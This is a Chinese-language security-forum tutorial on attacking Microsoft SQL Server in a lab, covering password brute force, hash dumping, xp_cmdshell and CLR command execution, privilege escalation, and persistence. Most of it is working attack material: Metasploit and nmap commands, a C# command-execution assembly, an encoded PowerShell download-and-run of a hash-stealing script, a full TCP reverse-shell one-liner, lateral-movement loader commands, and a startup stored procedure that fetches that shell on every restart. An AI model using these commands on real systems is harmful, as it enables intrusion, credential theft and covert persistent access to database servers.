# mssql攻防探究

> **来源**: https://forum.butian.net/share/2705  
> **文章ID**: 2705

---

使用nmap进行mssql攻击
===============

Nmap是基于Lua语言NSE脚本的集合，可与调用ms-sql的NSE脚本对目标系统进行扫描。可与使用以下脚本来查找ms-sql的NSE脚本。

```php
locate *.nse | grep ms-sql
```

![image.png](images/attach-b0f1eba8b15ae0db23d2fdf53cbbead54a0a4052.png)

### 使用脚本对mssql版本信息进行扫描

```php
nmap -p 1433 --script ms-sql-info 192.168.3.130
```

![image.png](images/attach-a79bcfc22ac3f675f48467737fe571c5d969d515.png)

### 对mssql进行暴力破解

```php
nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.3.130
```

可与看到，爆破成功账号 sa:admin  
![image.png](images/attach-c022ed40ca30034869617b9f0a6ff9447334dd8e.png)  
通过对脚本NSE文件进行cat，可与查看脚本使用方法。  
![image.png](images/attach-75d72ce69738e3ef3ad68848f9875a0934183d28.png)

### 使用NetBIOS进行枚举

发送具有无效域和空凭据的 MS-TDS NTLM 身份验证请求将导致远程服务使用 NTLMSSP 消息进行响应，该消息公开信息，包括 NetBIOS、DNS 和操作系统版本。

```php
nmap -p1433 --script ms-sql-ntlm-info 192.168.3.130
```

![image.png](images/attach-48f3a53e44bfade9390c4e1fe1b9f3ee957cd8f0.png)

### mssql密码hash转储

```php
nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=admin 192.168.3.130
```

可与使用hashcat，john等进行破解。  
![image.png](images/attach-b017c8ae9081015b47e860239ecc7192c0a3dcbf.png)

### 枚举数据库表

```php
nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=admin 192.168.3.130
```

![image.png](images/attach-1473da5a5f81e65cf9fda32e0b1c11353aba98ca.png)

### 执行xp\_cmdshell（可能脚本原因导致执行未成功）

```php
nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=admin,ms-sql-xp-cmdshell.cmd="net user" 192.168.3.130
```

### 执行mssql命令（可能脚本原因导致执行未成功）

```php
nmap -p1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=admin,ms-sql-query.query="sp_databases" 192.168.3.130
```

使用msf进行mssql攻击
==============

### 定位Mssql服务器

```php
msf6 > use auxiliary/scanner/mssql/mssql_ping 
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 192.168.3.0/24
msf6 auxiliary(scanner/mssql/mssql_ping) > set threads 255
msf6 auxiliary(scanner/mssql/mssql_ping) > exploit 
```

![image.png](images/attach-4c1b7b2dd6205dba877eddcb22f84862aaf702ba.png)

### 密码破解

```php
use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.130
set user_file users.txt
set pass_file users.txt
set verbose false
exploit
```

![image.png](images/attach-3eef4f57bd693e44d8404a96994b03d42b0cf41e.png)

### 获取mssql版本信息

```php
use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.3.130
set username sa
set password admin
exploit
```

![image.png](images/attach-b27b4b5ec3ff795ebb4311d7253f1586a8c2f29a.png)

### 枚举mssql信息

可以看到数据库被授予了哪些权限、哪些登录可用以及其他有用的信息

```php
use auxiliary/admin/mssql/mssql_enum
set rhosts 192.168.3.130
set username sa
set password admin
exploit
```

![image.png](images/attach-7fb71c1f43e98b2c0b3f66493b063d3a884bd9c5.png)

### 用户枚举

查询mssql所有可以正确登录的用户

```php
use auxiliary/admin/mssql/mssql_enum_sql_login
set rhosts 192.168.3.130
set username sa
set password admin
exploit
```

![image.png](images/attach-de34862732f99c1b2055f8251e12b771126a3705.png)

### 捕获mssql登录

创建一个虚假mssql服务器，捕获登录时的账号密码

```php
use auxiliary/server/capture/mssql
set srvhost 192.168.3.133
exploit
```

尝试登录虚假服务器

```php
sqsh -S 192.168.3.133 -U sa -P "admin"
```

### Mssql Hash转储

```php
use auxiliary/scanner/mssql/mssql_hashdump
set rhosts 192.168.3.130
set username sa
set password admin
exploit
```

![image.png](images/attach-ae399ae5798facb54fc0c220e006a045557f2752.png)

### 通过xp\_cmdshell反弹shell

```php
use exploit/windows/mssql/mssql_payload
set rhosts 192.168.3.130
set username sa
set password admin
set method old
exploit
```

由于mssql服务器的系统版本较低，因此method选择为old，否则可能反弹Shell失败  
![image.png](images/attach-b3b93472c8d2512b90134d5991cffe42c1395a36.png)  
![image.png](images/attach-7c75b58ad131aecbdc680665dd36ec892eea59a1.png)

### 执行系统命令

```php
use auxiliary/admin/mssql/mssql_exec
set rhosts 192.168.3.130
set username sa
set password admin
set cmd "net user"
exploit
```

![image.png](images/attach-49ae80301888923c2387b2179d14893ddc48e552.png)

### 添加mssql用户

创建user.sql文件，记住把密码设置复杂一点，否则数据库可能由于密码过于简单而添加失败

```php
CREATE LOGIN test1 WITH PASSWORD = 'admin@123';
EXEC master..sp_addsrvrolemember @loginame = N'test1', @rolename = N'sysadmin'; //设置为管理员用户
```

```php
use auxiliary/admin/mssql/mssql_sql_file
set rhosts 192.168.3.130
set username sa
set password admin
set sql_file user.sql
exploit
```

![image.png](images/attach-894a067c70203001c2ad4c7b59fa4cf1799204be.png)  
可以看到用户已经成功添加![image.png](images/attach-910114a2ec0a1c57f69f02db6ecc7f48dec3355b.png)

### 使用CLR执行命令反弹Shell

```php
use exploit/windows/mssql/mssql_clr_payload
set payload windows/meterpreter/reverse_tcp
set rhosts 192.168.3.130
set username sa
set password admin
exploit
```

![image.png](images/attach-16fdfd04d953a61c14c3a6e6b75d9bbb04f2bf22.png)

### 从 db\_owner 到 sysadmin

```php
use admin/mssql/mssql_escalate_dbowner
set rhosts 192.168.3.130
set username test1
set password admin@123
exploit
```

![image.png](images/attach-fd191391484172db162b828ffd0393772dda3677.png)  
可以看到已经从只有public升级为sysadmin  
![image.png](images/attach-0fde26a6f58c39ffda1badd4a853be8c4aa29462.png)

### 模拟其他用户提权

```php
use auxiliary/admin/mssql/mssql_escalate_execute_as
set rhosts 192.168.3.130
set username test1
set password admin@123
exploit
```

![image.png](images/attach-e41969c72bd1f10aa4d53b90024955a7fa2eb9f5.png)

使用 xp\_cmdshell 执行命令
====================

### 启动xp\_cmdshell

![image.png](images/attach-42550b39535cf27cbc09ab5dc18a8e1d0642fc4f.png)  
![image.png](images/attach-19cda71c4130a8bbafaaf49f7eab67657960a50c.png)

```php
/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */
SELECT IS_SRVROLEMEMBER('sysadmin');

/* 查看是否存在 xp_cmdshell，返回 1 则存在 */
SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell'

/* 开启 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

/* 关闭 xp_cmdshell */
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
```

### 使用sqsh执行命令

```php
sqsh -S 192.168.3.130 -U sa -P "admin"
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go
xp_cmdshell 'whoami';
go
```

![image.png](images/attach-d89e7cc014a4611d469a7f45400a2446cacb89b0.png)

### mssqlcliient.py连接mssql

```php
python3 mssqlclient.py administrator:123456@192.168.3.129 -port 1433 -windows-auth
enable_xp_cmdshell
xp_cmdshell "net user"
```

![image.png](images/attach-e12d6651999cbbf05a3d4f875133119a198db44e.png)

### crackmapexec调用web\_delivery模块上线Msf

msf启动web\_delivery模块进行监听

```php
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.3.133
exploit
```

![image.png](images/attach-ba3a24105dae112a58e895fa4f1d954bac3f9f61.png)  
调用crackmapexec执行命令

```php
crackmapexec mssql 192.168.3.129 -u 'administrator' -p '123456' -M web_delivery -o URL=http://192.168.3.133:8080/9SwSSB2rIZOWEP
```

![image.png](images/attach-797f00559c231fa95e9c487740de9e76e5a705d0.png)

### 搜集mssql的sa密码

在目标网站目录下寻找config文件

```php
# dir /b /s web.config >> tmps.logs
# del tmps.logs /F
```

![image.png](images/attach-a8aaec82037de8f1e75cfdb3525f87a25fff7ecd.png)  
确认下 mssql 数据库连接的账号密码字段名 \[ 如下, “User=”,“Password=” \],因为后续我们需要根据这个字段名来批量撸 sa 的密码

```php
type C:\WebCode\sycms_2.1\Web.config
```

![image.png](images/attach-6f8d63292a9084123606d33dc00c24b07dd55b46.png)  
根据找到的特征批量抓密码

```php
# findstr /c:"User Id=" /c:"Password=" /si web.config >> tmps.logs
# del tmps.logs /F
```

### 通过HTTP加密代理建立tcp连接

```php
python2 abpttsclient.py -u "http://192.168.3.13:84/abptts.aspx" -c webshell\config.txt -f 127.0.0.1:143/192.168.3.13:1433
```

将本地143端口转发到1433  
使用服务端工具连接即可  
![image.png](images/attach-74ef5d2f1fc6f93106690677dc99e241840ae9bd.png)  
**尝试启动xp\_cmdshell**

```php
select @@version;
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
exec master..xp_cmdshell 'tasklist | findstr /c:"ekrn.exe" /c:"egui.exe" & whoami /user';
exec master..xp_cmdshell 'wmic OS get Caption,CSDVersion,OSArchitecture,Version';
exec master..xp_cmdshell 'wmic product get name,version';
```

![image.png](images/attach-9d4315211ba78559896f30d2377cb8012d20109d.png)  
`query user`查看一下最近登录的用户  
![image.png](images/attach-115b453a3612583d590a79ad5ddc6c8fbcbe1a0a.png)

### 尝试远程加载powershell脚本抓取内网hash

```php
PS C:\> $text = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.1/Get-PassHashes.ps1');Get-PassHashes;"
PS C:\> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS C:\> $EncodedText =[Convert]::ToBase64String($Bytes)
PS C:\> $EncodedText > bs64.txt
```

![image.png](images/attach-4705f467e8444f67322cd7d46f96d2cce6c58381.png)  
将bs64.txt的内容复制出来放到mssql执行powershell

```php
exec master..xp_cmdshell 'powershell -exec bypass -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADMALgAxAC8ARwBlAHQALQBQAGEAcwBzAEgAYQBzAGgAZQBzAC4AcABzADEACgAnACkAOwBHAGUAdAAtAFAAYQBzAHMASABhAHMAaABlAHMAOwA=';
```

![image.png](images/attach-3756f49920ce8f8666462c34fdc9fb709169f6f8.png)  
放hashcat跑跑或者彩虹表解密一下  
![image.png](images/attach-85034c34b02f24a228bdbba8f7862f71f7c5dad6.png)

### 尝试上线cs

如果目标是站库分离可以这么搞，如果没有直接用蚁剑上传即可

```php
# net use \\10.0.0.7\admin$ /user:"demo\administrator" "blackCeeeK#$%^2368"
# copy loader \\10.0.0.7\admin$\temp
# copy klsr \\10.0.0.7\admin$\temp\
# wmic /node:10.0.0.7 /user:"demo\administrator" /password:"blackCeeeK#$%^2368" PROCESS call create "c:\windows\temp\loader c:\windows\temp\klsr"
# del \\10.0.0.7\admin$\temp\loader /F
# del \\10.0.0.7\admin$\temp\klsr /F
# dir \\10.0.0.7\admin$\temp
# net use \\10.0.0.7\admin$ /del
```

### rdp 利用

`exec master..xp_cmdshell 'netstat -ano'` 查看开放端口  
![image.png](images/attach-75c620e1f32fb4527ae09e3ea0b2c9ff8aa5e7b2.png)  
依然还是用 abptts 做下转发,即把本地的 389 转到内网 10.0.0.7 机器的 3389 端口上

```php
python2 abpttsclient.py -u "http://192.168.3.13:84/abptts.aspx" -c webshell\config.txt -f 127.0.0.1:389/192.168.3.13:3389
```

查询rdp状态

```php
# reg query "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections
# reg query "hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp" /v portnumber
```

开启或关闭目标 rdp

```php
# reg add "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
# reg add "hkey_local_machine\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 1 /f
```

win 2003 下防火墙放行 rdp 端口

```php
# netsh firewall add portopening tcp 3389 "remote desktop"
# netsh firewall delete portopening tcp 3389
```

win2008 之后系统防火墙放行 rdp 端口

```php
# netsh advfirewall firewall add rule name="remote desktop" protocol=tcp dir=in localport=3389 action=allow
# netsh advfirewall firewall delete rule name="remote desktop" dir=in protocol=tcp localport=3389
```

### 禁用xp\_cmdshell

```php
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure;
exec master..xp_cmdshell 'whoami';
```

撸掉mssql所有账户的密码备用

```php
SELECT name, password_hash FROM master.sys.sql_logins
```

### xp\_cmdshell被删除

通过上传xplog70.dll恢复

```php
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
```

使用 CLR 程序集执行命令
==============

### 启用 CLR 与 GUI 集成

点击方面  
![image.png](images/attach-d0bfa47eec4e5c8eb79eb986067c2aef7df655b3.png)  
将外围应用配置器的 ClrIntegrationEnabled 的值从 false 变为 true  
![image.png](images/attach-504dd2c157387cddb680681005e1f4407577f3b5.png)  
右键msdb选择属性，发现可信为 false 且无法修改  
![image.png](images/attach-a53051881256fa5755ca9795e78fdd4451a44291.png)  
使用命令将其设置为true

```php
ALTER DATABASE [msdb] SET TRUSTWORTHY ON
```

### 利用 CLR 程序集执行命令

创建c#类库  
![1704861360677.png](images/attach-a5ae1816a4322df28446f9db202e9dd8fb7bea1a.png)  
添加代码并且生成DLL

```php
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

        // Mark the beginning of the result set.
        SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result set.
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};
```

![image.png](images/attach-a8a401959406481c4a801dce9c559da96bc2706c.png)  
在msdb数据库下新建程序集，导入生成的dll点击确定  
![image.png](images/attach-b42d694a1ddc56b74e425e5d0b97071cc64943cf.png)  
成功之后可以在程序集下看到导入的程序集  
![image.png](images/attach-08f76cef28e147c99d6b335ba355708a0db15730.png)  
使用以下命令创建过程

```php
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO
```

执行命令即可

```php
cmd_exec 'whoami'
```

![image.png](images/attach-bc96f7bd0a965784473a87b1b4bc84f4a03c614e.png)  
尝试使用命令行来添加clr，首先删除刚添加的程序集和过程

```php
DROP PROCEDURE  cmd_exec
DROP ASSEMBLY shell
```

选择调用的数据库

```php
use msdb
```

启用 CLR 集成

```php
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE
GO
```

查询是否启用了 CLR 集成，value为1则为开启

```php
SELECT * FROM sys.configurations WHERE name = 'clr enabled'
```

![image.png](images/attach-d254c64eea5332c7e547bb67ae4676e757cf92a6.png)  
启用可信任

```php
ALTER DATABASE msdb SET TRUSTWORTHY ON
```

查询是否执行成功，为1则开启

```php
select name, is_trustworthy_on from sys.databases
```

![image.png](images/attach-b44a936f6c7f1688afee21e738a533ecf6aa42a2.png)  
使用命令创建程序集

```php
CREATE ASSEMBLY shell
FROM 'c:\temp\shell.dll'
WITH PERMISSION_SET = UNSAFE;
```

![image.png](images/attach-8cf16dc90dd22d3c570188a8a5368759042f89ac.png)  
创建过程

```php
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
GO
```

成功执行命令  
![image.png](images/attach-e4e5eea4c1d84316f1bc8bdcf4116ccccf44066c.png)

### 16进制Dll转换

由于dll可能会被查杀，尝试转换为16进制导入，使用以下ps1脚本转换dll

```php
# Target file
$assemblyFile = "C:\\Users\\administrator\\Desktop\\cmd_exec.dll"

# Build top of TSQL CREATE ASSEMBLY statement
$stringBuilder = New-Object -Type System.Text.StringBuilder 
$stringBuilder.Append("CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x") | Out-Null

# Read bytes from file
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}

# Build bottom of TSQL CREATE ASSEMBLY statement
$stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Build create procedure command
$stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Create run os command
$stringBuilder.AppendLine("EXEC[dbo].[cmd_exec] 'whoami'") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Create file containing all commands
$stringBuilder.ToString() -join "" | Out-File C:\Users\administrator\Desktop\\dll_hex.txt
```

![image.png](images/attach-e282653dfa51f8e0a9848d243c83be8b15cc6d60.png)  
或使用PowerUpSql生成更加方便

```php
powershell
powershell -ep bypass
Import-Module .\PowerUpSQL.ps1
Create-SQLFileCLRDll -ProcedureName “runcmd” -OutFile runcmd -OutDir C:\Users\administrator\Desktop\
```

会在指定位置生成3个文件，直接调用即可  
![image.png](images/attach-5be4c7ead4ce2461861c6d89f391d7131c7f45e1.png)

### 使用PowerUpSQL远程调用执行CLR

```php
Invoke-SQLOSCmdCLR -Username sa -Password 'admin' -Instance "192.168.3.130,1433" -Command 'net user' -Verbose | Out-GridView
```

![image.png](images/attach-f729f5f17c0a9bdc0e49d5c0a88b169a2b9e9e66.png)

### 使用msf配合PowerUpSQL上线

```php
use exploit/windows/misc/hta_server
set srvhost 192.168.3.133
exploit
```

执行命令

```php
Invoke-SQLOSCmdCLR -Username sa -Password 'admin' -Instance "192.168.3.130,1433" -Command 'mshta.exe http://192.168.3.133:8080/GzoD8Ou5ltc.hta'
```

### 使用msf clr模块上线

```php
use exploit/windows/mssql/mssql_clr_payload
set rhosts 192.168.3.130
set username sa
set password admin
set payload windows/meterpreter/reverse_tcp
exploit
```

![image.png](images/attach-d1c47463902d9f9fb1049c4c78c5ca1927f43496.png)

### WarSQLKit

```php
https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit
```

使用 SP\_OACREATE 执行命令
====================

OLE 代表对象链接和嵌入。Microsoft 开发这项技术是为了让应用程序更轻松地共享数据。因此，自动化使应用程序能够操纵在其他应用程序中实现的对象。该自动化服务器通过 COM 接口展示其功能；对于不同的应用程序来读取它们，它进一步帮助它们通过检索对象和使用其服务来自动化其属性。

### 开启 OLE 自动化

查询是否开启

```php
EXEC sp_configure 'Ole Automation Procedures'; 
GO
```

config\_value 和 run\_value 均为0 这意味着 OLE 自动化已禁用  
![image.png](images/attach-308dbb5c32803e329ec3ae54626e503137d21e7d.png)  
开启 OLE 自动化

```php
sp_configure 'show advanced options', 1; 
GO 
RECONFIGURE; 
GO 
sp_configure 'Ole Automation Procedures', 1; 
GO 
RECONFIGURE; 
GO
```

![image.png](images/attach-cb20895e6a9071696c03859b9dbbcb7c72aba89f.png)  
执行命令，利用这种方式执行命令没用回显，只能输出到文件中

```php
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all > C:\\Users\\Administrator\\Desktop\\1.txt';
```

![image.png](images/attach-6ee5ecea74818f6378f1c273e1c0283e7284c529.png)

### 使用PowerUpSQL执行

```php
powershell
powershell -ep bypass
Invoke-SQLOSCmdOle -Username sa -Password admin -Instance "192.168.3.130,1433" -Command "whoami /all" -Verbose
```

![image.png](images/attach-cebcde3be8c310e9bcb248d9ea03c1149dd996b0.png)

用户权限提升之模拟
=========

MSSQL Impersonate 命令是一种根据其他用户名进行身份验证以执行系统查询的方法。为此，它通常与 CREATE USER 语句结合使用。当您使用模拟帐户时，SQL Server 会检查是否拥有查询引用的所有数据库的权限。

### 开启用户模拟

新建一个低权限用户  
![image.png](images/attach-5dfac314526fca252ca16481765d081064ba4005.png)  
右键登录名，点击属性，添加特定对象  
![image.png](images/attach-360e88ad367997fbcb857e53938895bc562d6d5a.png)  
选择对象类型为登录名。  
![image.png](images/attach-e30dcc7bed54a00add6fbafe6f248fd3110d5bd7.png)  
浏览对象，选择sa  
![image.png](images/attach-1a089bb4f499348d8f0fcf4471b96feacb7572ae.png)  
授予模拟权限。  
![image.png](images/attach-18ec26d229dd83972e11bf8edfe55f122dc30589.png)  
使用msf执行命令即可成功提权

```php
use auxiliary/admin/mssql/mssql_escalate_execute_as
set rhosts 192.168.3.130
set username lowpriv
set password admin
exploit
```

![image.png](images/attach-3778b4c4e870d9b643500959f23e354ea27be024.png)  
![image.png](images/attach-91b452190efeb42e76d172c7a67389b7f1f98e43.png)

使用外部脚本执行命令
==========

sqlserver 2019增添了许多新功能，安装时选择“机器学习服务和语言”，需要选中 R、Python、Java复选框。  
检查外部脚本是否启用

```php
sp_configure 'external scripts enabled'
GO
```

启动外部脚本

```php
EXECUTE sp_configure 'external scripts enabled', 1;
GO
RECONFIGURE;
GO
```

### 执行python命令

```php
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'
```

![image.png](images/attach-82a686be7ad123283f733da9818e850e045958fa.png)

### 执行R脚本

```php
EXEC sp_execute_external_script
@language=N'R',
@script=N'OutputDataSet <- data.frame(system("cmd.exe /c ipconfig",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO
```

![image.png](images/attach-6b6be1ea7a2b69d9c7b6133ff1bd8d78e0b2504b.png)

滥用 Trustworthy（db\_owner提权）
===========================

### 手动提权

创建public用户权限test  
![image.png](images/attach-8a1815fa0ec820ad58b9c1c043c1465c14e6d481.png)  
新建数据库ignite  
![image.png](images/attach-b80e7f34380133c11be37691e911d3294652eea9.png)  
编辑 test 用户的用户映射，使其拥有 ignite 数据库的 db\_owner 身份  
![image.png](images/attach-69708a76664f51a4985589872c1887827758a3ff.png)  
检查数据库是否启用了可信属性

```php
select name,is_trustworthy_on from sys.databases
```

可以看到 ignite 数据库暂未开启  
![image.png](images/attach-76241575edcf67efe11f51987bc404989911ddf6.png)  
激活其可信属性

```php
ALTER DATABASE [ignite] SET TRUSTWORTHY ON
```

![image.png](images/attach-af3cb4cda557a5e4719fc8e39d70924db54570d7.png)  
使用创建的 test 用户登录，在 ignite数据库中新建查询哪些用户是其 db\_owner

```php
use ignite;
SELECT DP1.name AS DatabaseRoleName,  
    isnull (DP2.name, 'No members') AS DatabaseUserName  
FROM sys.database_role_members AS DRM 
RIGHT OUTER JOIN sys.database_principals AS DP1 
    ON DRM.role_principal_id = DP1.principal_id 
LEFT OUTER JOIN sys.database_principals AS DP2 
    ON DRM.member_principal_id = DP2.principal_id 
WHERE DP1.type = 'R'
ORDER BY DP1.name;
```

可以看到已经存在 test 用户  
![image.png](images/attach-1189643dc439793e36c1b30df1d875140fa01812.png)  
由于 test 和 dbo 用户都是数据库的所有者，我们现在可以通过 test 来模拟 dbo 用户，一旦伪装成功，就能进一步获取权限。

```php
EXECUTE AS USER = 'dbo';
SELECT system_user;
```

![image.png](images/attach-373b078676a132575db7932d81d20391e18b02e8.png)  
上述查询已成功执行。现在，我们将借助以下查询将 raj 用户设置为 sysadmin，从而为它获得更多权限  
![image.png](images/attach-153b595ab65bae8e2cb41539bd7965909cbbf1f4.png)  
可以看到 test 用户的属性已经被设置为 admin  
![image.png](images/attach-e50dd4d5f4a63b40b41ee55d7f729168ffc28484.png)

### 使用 PowerUpSQL 提升权限

首先查看可信权限是否被激活

```php
Import-Module .\PowerUpSQL.ps1
Invoke-SQLAuditPrivTrustworthy -Username test -Password admin -Instance '192.168.3.137,1433' -Verbose
```

可以看到可信权限已经被打开  
![image.png](images/attach-fedb7d61a21b9f15529b8477bda57e60022bcf8c.png)

```php
Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
Invoke-SqlServer-Escalate-DbOwner -SqlUser raj -SqlPass Password@1 -SqlServerInstance WIN-P83OS778EQK\SQLEXPRESS
```

调用 [Powershellery](https://github.com/nullbind/Powershellery/) 项目的 SqlServer-Escalate-DbOwner 模块提升权限

```php
Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
Invoke-SqlServer-Escalate-DbOwner -SqlUser test -SqlPass admin -SqlServerInstance '192.168.3.137,1433'
```

成功升级为 sysadmin 权限  
![image.png](images/attach-13838e9fe5f8a5daacb1bd46dcff7307c0d24161.png)  
也可使用 msf 中的模块提升权限，这里不再赘述。

使用存储过程进行权限维持
============

使用 matser 数据库

```php
USE master
GO
```

这里假设 xp\_cmdshell 已被开启，选择使用 nishang 中的 Invoke-PowerShellTcpOneLine.ps1 脚本进行反弹shell

```php
$client = New-Object System.Net.Sockets.TCPClient("192.168.3.130",6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

创建存储过程 powershell 远程调用脚本

```php
CREATE PROCEDURE test_sp
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(\"http://192.168.3.133:8081/Invoke-PowerShellTcpOneLine.ps1\")"'
GO
```

我们现在将此存储过程移至启动阶段，因为我们希望它在服务器启动后立即执行

```php
EXEC sp_procoption @ProcName = 'test_sp'
, @OptionName = 'startup'
, @OptionValue = 'on';
```

查询启动中拥有的存储过程，已经添加成功

```php
SELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;
```

![image.png](images/attach-ff6a9f46ccd521b62c840b6959939d28f9221b02.png)  
将 sqlserver 服务重新启动，成功反弹 shell  
![image.png](images/attach-70404a99e80ab0f24b2dbc866fe73f3218a78ac1.png)  
![image.png](images/attach-7aa5af185fae41dc21709b86fb31e0e094728767.png)
